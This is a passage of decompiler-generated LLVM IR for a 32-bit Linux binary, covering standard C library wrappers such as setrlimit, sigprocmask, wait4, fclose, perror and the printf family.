  %v0_805bd89 = load i32, i32* @ebx, align 4
  %v1_805bd91 = call i32 @int80_syscall(i32 142)
  store i32 %v0_805bd89, i32* @ebx, align 4
  store i32 %v1_805bd91, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805bd91, -4095
  br i1 %tmp, label %dec_label_pc_805bda9, label %dec_label_pc_805bd9d

dec_label_pc_805bd9d:                             ; preds = %entry
  %v1_805bd9d = call i32 @__errno_location(i32 %v0_805bd89)
  %v0_805bda2 = load i32, i32* %esi.global-to-local, align 4
  %v1_805bda2 = sub i32 0, %v0_805bda2
  %v2_805bda4 = inttoptr i32 %v1_805bd9d to i32*
  store i32 %v1_805bda2, i32* %v2_805bda4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805bda9

dec_label_pc_805bda9:                             ; preds = %entry, %dec_label_pc_805bd9d
  %v0_805bdaa = phi i32 [ %v1_805bd91, %entry ], [ -1, %dec_label_pc_805bd9d ]
  %v2_805bda9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805bda9, i32* @edx, align 4
  %v2_805bdac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805bdac, i32* @esi, align 4
  ret i32 %v0_805bdaa

; uselistorder directives
  uselistorder i32 %v1_805bd91, { 1, 0, 2 }
  uselistorder i32 %v0_805bd89, { 1, 0 }
  uselistorder label %dec_label_pc_805bda9, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, %rlimit* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bdb0 = load i32, i32* @ebx, align 4
  store i32 %v0_805bdb0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805bdc3 = call i32 @setrlimit(i32 %arg1, %rlimit* %arg2)
  store i32 %v4_805bdc3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805bdc3, -4095
  br i1 %tmp, label %dec_label_pc_805bddc, label %dec_label_pc_805bdd0

dec_label_pc_805bdd0:                             ; preds = %entry
  %v0_805bdd0 = load i32, i32* %stack_var_-4, align 4
  %v1_805bdd0 = call i32 @__errno_location(i32 %v0_805bdd0)
  %v0_805bdd5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805bdd5 = sub i32 0, %v0_805bdd5
  %v2_805bdd7 = inttoptr i32 %v1_805bdd0 to i32*
  store i32 %v1_805bdd5, i32* %v2_805bdd7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805bddc

dec_label_pc_805bddc:                             ; preds = %entry, %dec_label_pc_805bdd0
  %v0_805bddd = phi i32 [ %v4_805bdc3, %entry ], [ -1, %dec_label_pc_805bdd0 ]
  %v2_805bde0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bde0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805bddd

; uselistorder directives
  uselistorder i32 %v4_805bdc3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805bddc, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bde4 = load i32, i32* @ebx, align 4
  store i32 %v0_805bde4, i32* %stack_var_-4, align 4
  %v1_805bded = call i32 @setsid(i32 %v0_805bde4)
  store i32 %v1_805bded, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805bded, -4095
  br i1 %tmp, label %dec_label_pc_805be04, label %dec_label_pc_805bdf8

dec_label_pc_805bdf8:                             ; preds = %entry
  %v0_805bdf8 = load i32, i32* %stack_var_-4, align 4
  %v1_805bdf8 = call i32 @__errno_location(i32 %v0_805bdf8)
  %v0_805bdfd = load i32, i32* %ebx.global-to-local, align 4
  %v1_805bdfd = sub i32 0, %v0_805bdfd
  %v2_805bdff = inttoptr i32 %v1_805bdf8 to i32*
  store i32 %v1_805bdfd, i32* %v2_805bdff, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805be04

dec_label_pc_805be04:                             ; preds = %entry, %dec_label_pc_805bdf8
  %v0_805be05 = phi i32 [ %v1_805bded, %entry ], [ -1, %dec_label_pc_805bdf8 ]
  %v2_805be04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805be04, i32* @edx, align 4
  %v2_805be08 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805be08, i32* @ebx, align 4
  ret i32 %v0_805be05

; uselistorder directives
  uselistorder i32 %v1_805bded, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805be04, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_805be0d = load i32, i32* @esi, align 4
  %v4_805be11 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_805be11, i32* @ecx, align 4
  %v2_805be1d = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_805be1d, label %dec_label_pc_805be36, label %dec_label_pc_805be21

dec_label_pc_805be21:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_805be36, label %dec_label_pc_805be26

dec_label_pc_805be26:                             ; preds = %dec_label_pc_805be21
  %v1_805be26 = call i32 @__errno_location(i32 %v0_805be0d)
  %v1_805be2b = inttoptr i32 %v1_805be26 to i32*
  store i32 22, i32* %v1_805be2b, align 4
  br label %dec_label_pc_805be5d

dec_label_pc_805be36:                             ; preds = %dec_label_pc_805be21, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805be3b = load i32, i32* @ebx, align 4
  %v7_805be43 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805be3b, i32* @ebx, align 4
  store i32 %v7_805be43, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_805be43, -4095
  br i1 %tmp11, label %dec_label_pc_805be5d, label %dec_label_pc_805be4f

dec_label_pc_805be4f:                             ; preds = %dec_label_pc_805be36
  %v1_805be4f = call i32 @__errno_location(i32 %v0_805be3b)
  %v0_805be54 = load i32, i32* %esi.global-to-local, align 4
  %v1_805be54 = sub i32 0, %v0_805be54
  %v2_805be56 = inttoptr i32 %v1_805be4f to i32*
  store i32 %v1_805be54, i32* %v2_805be56, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805be5d

dec_label_pc_805be5d:                             ; preds = %dec_label_pc_805be4f, %dec_label_pc_805be36, %dec_label_pc_805be26
  %storemerge = phi i32 [ -1, %dec_label_pc_805be26 ], [ %v7_805be43, %dec_label_pc_805be36 ], [ -1, %dec_label_pc_805be4f ]
  %v2_805be5d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805be5d, i32* @edx, align 4
  store i32 %v0_805be0d, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_805be43, { 1, 0, 2 }
  uselistorder i32 %v0_805be3b, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805be64 = load i32, i32* @ebx, align 4
  store i32 %v0_805be64, i32* %stack_var_-4, align 4
  %v4_805be6d = ptrtoint %_TYPEDEF_sigset_t* %arg1 to i32
  store i32 %v4_805be6d, i32* %ebx.global-to-local, align 4
  %v3_805be78 = call i32 @sigsuspend(%_TYPEDEF_sigset_t* %arg1)
  store i32 %v3_805be78, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805be78, -4095
  br i1 %tmp, label %dec_label_pc_805be91, label %dec_label_pc_805be85

dec_label_pc_805be85:                             ; preds = %entry
  %v0_805be85 = load i32, i32* %stack_var_-4, align 4
  %v1_805be85 = call i32 @__errno_location(i32 %v0_805be85)
  %v0_805be8a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805be8a = sub i32 0, %v0_805be8a
  %v2_805be8c = inttoptr i32 %v1_805be85 to i32*
  store i32 %v1_805be8a, i32* %v2_805be8c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805be91

dec_label_pc_805be91:                             ; preds = %entry, %dec_label_pc_805be85
  %v0_805be92 = phi i32 [ %v3_805be78, %entry ], [ -1, %dec_label_pc_805be85 ]
  %v2_805be91 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805be91, i32* @edx, align 4
  %v2_805be95 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805be95, i32* @ebx, align 4
  ret i32 %v0_805be92

; uselistorder directives
  uselistorder i32 %v3_805be78, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %_TYPEDEF_sigset_t* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805be91, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805be98 = load i32, i32* @edi, align 4
  store i32 %v0_805be98, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_805bea0 = load i32, i32* @ebx, align 4
  %v2_805bea8 = call i32 @time(i32* %arg1)
  store i32 %v0_805bea0, i32* @ebx, align 4
  store i32 %v2_805bea8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805bea8, -4095
  br i1 %tmp, label %dec_label_pc_805bec0, label %dec_label_pc_805beb4

dec_label_pc_805beb4:                             ; preds = %entry
  %v1_805beb4 = call i32 @__errno_location(i32 %v0_805bea0)
  %v0_805beb9 = load i32, i32* %edi.global-to-local, align 4
  %v1_805beb9 = sub i32 0, %v0_805beb9
  %v2_805bebb = inttoptr i32 %v1_805beb4 to i32*
  store i32 %v1_805beb9, i32* %v2_805bebb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805bec0

dec_label_pc_805bec0:                             ; preds = %entry, %dec_label_pc_805beb4
  %v0_805bec1 = phi i32 [ %v2_805bea8, %entry ], [ -1, %dec_label_pc_805beb4 ]
  %v2_805bec0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805bec0, i32* @edx, align 4
  %v2_805bec4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bec4, i32* @edi, align 4
  ret i32 %v0_805bec1

; uselistorder directives
  uselistorder i32 %v2_805bea8, { 1, 0, 2 }
  uselistorder i32 %v0_805bea0, { 1, 0 }
  uselistorder label %dec_label_pc_805bec0, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_805bed5 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_805bed5
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805bee0 = load i32, i32* @edi, align 4
  %v0_805bee1 = load i32, i32* @esi, align 4
  store i32 %v0_805bee1, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_805bef5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805befd = call i32 @wait4(i32 %v0_805bef5, i32 %v0_805bee1, i32 %v0_805bee0, i32 %tmp5)
  store i32 %v0_805bef5, i32* @ebx, align 4
  store i32 %v4_805befd, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805befd, -4095
  br i1 %tmp, label %dec_label_pc_805bf15, label %dec_label_pc_805bf09

dec_label_pc_805bf09:                             ; preds = %entry
  %v1_805bf09 = call i32 @__errno_location(i32 %v0_805bef5)
  %v0_805bf0e = load i32, i32* %esi.global-to-local, align 4
  %v1_805bf0e = sub i32 0, %v0_805bf0e
  %v2_805bf10 = inttoptr i32 %v1_805bf09 to i32*
  store i32 %v1_805bf0e, i32* %v2_805bf10, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805bf15

dec_label_pc_805bf15:                             ; preds = %entry, %dec_label_pc_805bf09
  %v0_805bf16 = phi i32 [ %v4_805befd, %entry ], [ -1, %dec_label_pc_805bf09 ]
  %v2_805bf18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805bf18, i32* @esi, align 4
  store i32 %v0_805bee0, i32* @edi, align 4
  ret i32 %v0_805bf16

; uselistorder directives
  uselistorder i32 %v4_805befd, { 1, 0, 2 }
  uselistorder i32 %v0_805bef5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805bf15, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805bf2d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_805bf2d
}

define i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bf38 = load i32, i32* @edi, align 4
  store i32 %v0_805bf38, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805bf48 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805bf50 = call i32 @write(i32 %v0_805bf48, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805bf48, i32* @ebx, align 4
  store i32 %v3_805bf50, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805bf50, -4095
  br i1 %tmp, label %dec_label_pc_805bf68, label %dec_label_pc_805bf5c

dec_label_pc_805bf5c:                             ; preds = %entry
  %v1_805bf5c = call i32 @__errno_location(i32 %v0_805bf48)
  %v0_805bf61 = load i32, i32* %edi.global-to-local, align 4
  %v1_805bf61 = sub i32 0, %v0_805bf61
  %v2_805bf63 = inttoptr i32 %v1_805bf5c to i32*
  store i32 %v1_805bf61, i32* %v2_805bf63, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805bf68

dec_label_pc_805bf68:                             ; preds = %entry, %dec_label_pc_805bf5c
  %v0_805bf69 = phi i32 [ %v3_805bf50, %entry ], [ -1, %dec_label_pc_805bf5c ]
  %v2_805bf68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805bf68, i32* @edx, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v2_805bf6c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bf6c, i32* @edi, align 4
  ret i32 %v0_805bf69

; uselistorder directives
  uselistorder i32 %v3_805bf50, { 1, 0, 2 }
  uselistorder i32 %v0_805bf48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @write, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805bf68, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805bf74 = add i32 %arg1, 128
  %v6_805bf7f = icmp ugt i32 %v1_805bf74, 383
  br i1 %v6_805bf7f, label %dec_label_pc_805bf8a, label %dec_label_pc_805bf81

dec_label_pc_805bf81:                             ; preds = %entry
  %v0_805bf81 = load i32, i32* inttoptr (i32 134697956 to i32*), align 4
  %v2_805bf86 = mul i32 %arg1, 2
  %v3_805bf86 = add i32 %v0_805bf81, %v2_805bf86
  %v4_805bf86 = inttoptr i32 %v3_805bf86 to i16*
  %v5_805bf86 = load i16, i16* %v4_805bf86, align 2
  %v6_805bf86 = sext i16 %v5_805bf86 to i32
  br label %dec_label_pc_805bf8a

dec_label_pc_805bf8a:                             ; preds = %entry, %dec_label_pc_805bf81
  %v0_805bf8a = phi i32 [ %arg1, %entry ], [ %v6_805bf86, %dec_label_pc_805bf81 ]
  ret i32 %v0_805bf8a

; uselistorder directives
  uselistorder label %dec_label_pc_805bf8a, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805bf90 = load i32, i32* @ebp, align 4
  %v0_805bf91 = load i32, i32* @edi, align 4
  %v0_805bf92 = load i32, i32* @esi, align 4
  %v0_805bf93 = load i32, i32* @ebx, align 4
  %v4_805bf97 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805bf97, i32* @esi, align 4
  %v1_805bf9b = add i32 %v4_805bf97, 52
  %v2_805bf9b = inttoptr i32 %v1_805bf9b to i32*
  %v3_805bf9b = load i32, i32* %v2_805bf9b, align 4
  store i32 %v3_805bf9b, i32* @ebp, align 4
  %v1_805bf9e = icmp eq i32 %v3_805bf9b, 0
  %v1_805bfa0 = icmp eq i1 %v1_805bf9e, false
  br i1 %v1_805bfa0, label %dec_label_pc_805bfc1, label %dec_label_pc_805bfa2

dec_label_pc_805bfa2:                             ; preds = %entry
  %v1_805bfa2 = add i32 %v4_805bf97, 56
  store i32 %v1_805bfa2, i32* @ebx, align 4
  %v4_805bfb1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 %v1_805bfa2)
  %v0_805bfb6 = load i32, i32* @ebx, align 4
  %v1_805bfb9 = call i32 @pthread_mutex_lock(i32 %v0_805bfb6)
  %v0_805bfc3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bfc1

dec_label_pc_805bfc1:                             ; preds = %entry, %dec_label_pc_805bfa2
  %v0_805bfcb = phi i32 [ %v4_805bf97, %entry ], [ %v0_805bfc3.pre, %dec_label_pc_805bfa2 ]
  store i32 0, i32* @edi, align 4
  %v1_805bfc3 = inttoptr i32 %v0_805bfcb to i8*
  %v2_805bfc3 = load i8, i8* %v1_805bfc3, align 1
  %v3_805bfc3 = and i8 %v2_805bfc3, 64
  %v4_805bfc3 = icmp eq i8 %v3_805bfc3, 0
  br i1 %v4_805bfc3, label %dec_label_pc_805bfc1.dec_label_pc_805bfd6_crit_edge, label %dec_label_pc_805bfc8

dec_label_pc_805bfc1.dec_label_pc_805bfd6_crit_edge: ; preds = %dec_label_pc_805bfc1
  br label %dec_label_pc_805bfd6

dec_label_pc_805bfc8:                             ; preds = %dec_label_pc_805bfc1
  %v1_805bfcc = inttoptr i32 %v0_805bfcb to i16*
  %v2_805bfcc = call i32 @fflush_unlocked(i16* %v1_805bfcc)
  store i32 %v2_805bfcc, i32* @edi, align 4
  %v0_805bfd9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bfd6

dec_label_pc_805bfd6:                             ; preds = %dec_label_pc_805bfc1.dec_label_pc_805bfd6_crit_edge, %dec_label_pc_805bfc8
  %v0_805bfd9 = phi i32 [ %v0_805bfcb, %dec_label_pc_805bfc1.dec_label_pc_805bfd6_crit_edge ], [ %v0_805bfd9.pre, %dec_label_pc_805bfc8 ]
  %v1_805bfd9 = add i32 %v0_805bfd9, 4
  %v2_805bfd9 = inttoptr i32 %v1_805bfd9 to i32*
  %v3_805bfd9 = load i32, i32* %v2_805bfd9, align 4
  %v1_805bfdc = call i32 @__libc_close(i32 %v3_805bfd9)
  %v0_805bfe4 = load i32, i32* @esi, align 4
  %v1_805bfe4 = add i32 %v0_805bfe4, 4
  %v2_805bfe4 = inttoptr i32 %v1_805bfe4 to i32*
  store i32 -1, i32* %v2_805bfe4, align 4
  %v2_805bff5 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805bff5, i32* @ebx, align 4
  %v2_805bffa = icmp slt i32 %v1_805bfdc, 0
  %v1_805c001 = load i32, i32* @edi, align 4
  %v3_805c001 = select i1 %v2_805bffa, i32 -1, i32 %v1_805c001
  store i32 %v3_805c001, i32* @edi, align 4
  %v4_805c004 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134589241, i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  %v1_805c010 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  %v0_805c015 = load i32, i32* @global_var_807bcdc.636, align 4
  %v1_805c01a = add i32 %v0_805c015, 1
  store i32 %v1_805c01a, i32* @global_var_807bcdc.636, align 4
  %v3_805c025 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805c02a = load i32, i32* @esi, align 4
  %v1_805c02a = inttoptr i32 %v0_805c02a to i32*
  %v2_805c02a = load i32, i32* %v1_805c02a, align 4
  %v1_805c02f = and i32 %v2_805c02a, 24576
  %v1_805c034 = or i32 %v1_805c02f, 48
  %v1_805c039 = trunc i32 %v1_805c034 to i16
  %v3_805c039 = inttoptr i32 %v0_805c02a to i16*
  store i16 %v1_805c039, i16* %v3_805c039, align 2
  br i1 %v1_805bfa0, label %dec_label_pc_805c04f, label %dec_label_pc_805c03e

dec_label_pc_805c03e:                             ; preds = %dec_label_pc_805bfd6
  %v3_805c047 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805c04f

dec_label_pc_805c04f:                             ; preds = %dec_label_pc_805bfd6, %dec_label_pc_805c03e
  %v0_805c04f = load i32, i32* @esi, align 4
  %v1_805c04f = add i32 %v0_805c04f, 1
  %v2_805c04f = inttoptr i32 %v1_805c04f to i8*
  %v3_805c04f = load i8, i8* %v2_805c04f, align 1
  %v4_805c04f = and i8 %v3_805c04f, 64
  %v5_805c04f = icmp eq i8 %v4_805c04f, 0
  br i1 %v5_805c04f, label %dec_label_pc_805c063, label %dec_label_pc_805c055

dec_label_pc_805c055:                             ; preds = %dec_label_pc_805c04f
  %v1_805c058 = add i32 %v0_805c04f, 8
  %v2_805c058 = inttoptr i32 %v1_805c058 to i32*
  %v3_805c058 = load i32, i32* %v2_805c058, align 4
  %v1_805c05b = call i32 @free(i32 %v3_805c058)
  br label %dec_label_pc_805c063

dec_label_pc_805c063:                             ; preds = %dec_label_pc_805c04f, %dec_label_pc_805c055
  %v4_805c06f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134589241, i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  %v1_805c07b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  %v0_805c081 = load i32, i32* @global_var_807bce0.637, align 32
  %v1_805c081 = add i32 %v0_805c081, 1
  store i32 %v1_805c081, i32* @global_var_807bce0.637, align 32
  %v3_805c08b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  %v0_805c090 = call i32 @_stdio_openlist_dec_use()
  %v0_805c098 = load i32, i32* @edi, align 4
  store i32 %v0_805bf93, i32* @ebx, align 4
  store i32 %v0_805bf92, i32* @esi, align 4
  store i32 %v0_805bf91, i32* @edi, align 4
  store i32 %v0_805bf90, i32* @ebp, align 4
  ret i32 %v0_805c098

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_805c063, { 1, 0 }
  uselistorder label %dec_label_pc_805c04f, { 1, 0 }
  uselistorder label %dec_label_pc_805bfd6, { 1, 0 }
  uselistorder label %dec_label_pc_805bfc1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805c0af = inttoptr i32 %arg2 to i8*
  %v5_805c0af = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_805c0af, i32 0, i32 -1)
  ret i32 %v5_805c0af
}

define i32 @perror(i8* %arg1) local_unnamed_addr {
entry:
  %v1_805c0bf = icmp eq i8* %arg1, null
  br i1 %v1_805c0bf, label %dec_label_pc_805c0cd, label %dec_label_pc_805c0c3

dec_label_pc_805c0c3:                             ; preds = %entry
  %v4_805c0bb = ptrtoint i8* %arg1 to i32
  %v2_805c0c3 = load i8, i8* %arg1, align 1
  %v3_805c0c3 = icmp eq i8 %v2_805c0c3, 0
  %v1_805c0cb = icmp eq i1 %v3_805c0c3, false
  br i1 %v1_805c0cb, label %dec_label_pc_805c0d4, label %dec_label_pc_805c0cd

dec_label_pc_805c0cd:                             ; preds = %dec_label_pc_805c0c3, %entry
  br label %dec_label_pc_805c0d4

dec_label_pc_805c0d4:                             ; preds = %dec_label_pc_805c0c3, %dec_label_pc_805c0cd
  %v0_805c0d5 = phi i32 [ ptrtoint (i32* @global_var_806f1d9.639 to i32), %dec_label_pc_805c0cd ], [ %v4_805c0bb, %dec_label_pc_805c0c3 ]
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_806f1d9.639 to i32), %dec_label_pc_805c0cd ], [ ptrtoint ([3 x i8]* @global_var_806f1d7.638 to i32), %dec_label_pc_805c0c3 ]
  %v0_805c0d4 = phi i32 [ ptrtoint (i32* @global_var_806f1d9.639 to i32), %dec_label_pc_805c0cd ], [ ptrtoint ([3 x i8]* @global_var_806f1d7.638 to i32), %dec_label_pc_805c0c3 ]
  store i32 %storemerge, i32* @edx, align 4
  %v0_805c0db = load i32, i32* inttoptr (i32 134697968 to i32*), align 16
  %v6_805c0e1 = call i32 @fprintf(i32 %v0_805c0db, i32 ptrtoint ([8 x i8]* @global_var_806d8c0.640 to i32), i32 %v0_805c0d5, i32 %v0_805c0d4)
  ret i32 %v6_805c0e1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_806f1d9.639 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_805c0d4, { 1, 0 }
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805c0fd = inttoptr i32 %arg1 to i8*
  %v5_805c0fd = call i32 @__GI_vsnprintf(i8* %v4_805c0fd, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_805c0fd
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805c10b = ptrtoint i32* %stack_var_12 to i32
  %v0_805c113 = load i32, i32* @edx, align 4
  %v4_805c11d = inttoptr i32 %arg1 to i16*
  %v5_805c11d = call i32 @__GI_vfprintf(i16* %v4_805c11d, i32 %arg2, i32 %v2_805c10b, i32 %v0_805c113)
  ret i32 %v5_805c11d
}

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_805c12b = ptrtoint i32* %stack_var_16 to i32
  %v4_805c140 = inttoptr i32 %arg1 to i8*
  %v5_805c140 = call i32 @__GI_vsnprintf(i8* %v4_805c140, i32 %arg2, i32 %arg3, i32 %v2_805c12b)
  ret i32 %v5_805c140
}

define i32 @__GI_asprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805c14f = ptrtoint i32* %stack_var_12 to i32
  %v0_805c157 = load i32, i32* @edx, align 4
  %v4_805c161 = inttoptr i32 %arg1 to i32*
  %v5_805c161 = call i32 @__GI_vasprintf(i32* %v4_805c161, i32 %arg2, i32 %v2_805c14f, i32 %v0_805c157)
  ret i32 %v5_805c161
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805c16f = ptrtoint i32* %stack_var_12 to i32
  %v4_805c182 = inttoptr i32 %arg1 to i8*
  %v5_805c182 = call i32 @__GI_vsnprintf(i8* %v4_805c182, i32 -1, i32 %arg2, i32 %v2_805c16f)
  ret i32 %v5_805c182
}

define i32 @__GI_vasprintf(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* %stack_var_-44, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805c18e = load i32, i32* @esi, align 4
  %v0_805c18f = load i32, i32* @ebx, align 4
  store i32 %v0_805c18f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v5_805c1a9 = call i32 @__GI_vsnprintf(i8* null, i32 0, i32 %arg3, i32 %tmp10)
  %v0_805c1b1 = load i32, i32* @edi, align 4
